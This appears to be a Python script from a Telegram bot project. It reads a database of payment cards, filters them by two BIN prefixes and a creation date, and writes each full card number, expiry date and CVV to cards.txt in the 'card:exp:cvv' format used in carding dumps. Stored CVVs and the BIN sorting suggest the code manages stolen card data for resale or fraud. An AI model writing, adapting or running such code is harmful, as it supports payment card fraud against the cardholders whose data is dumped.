import asyncio
import datetime

from aiogram import Bot, types

import main_config
from models import base, Cards


async def get():
    await base.on_startup()
    today = datetime.datetime.today().replace(minute=0, second=0, hour=0, month=5)
    file = open('cards.txt', 'w')
    bins = '''5356 66
4462 9221'''.split('\n')
    for b in bins:
        result = ''
        cards = await Cards.query.where((Cards.created > today) & (Cards.card.startswith(b))).gino.all()
        for c in cards:
            result += f"{c.card}:{c.exp}:{c.cvv}\n"
        '''cards = await Cards.query.where((Cards.created == None) & (Cards.card.startswith(b))).gino.all()
        for c in cards:
            result += f"{c.card}:{c.exp}:{c.cvv}\n"'''
        file.write(result)
    file.close()
if __name__ == '__main__':
    asyncio.get_event_loop().run_until_complete(get())
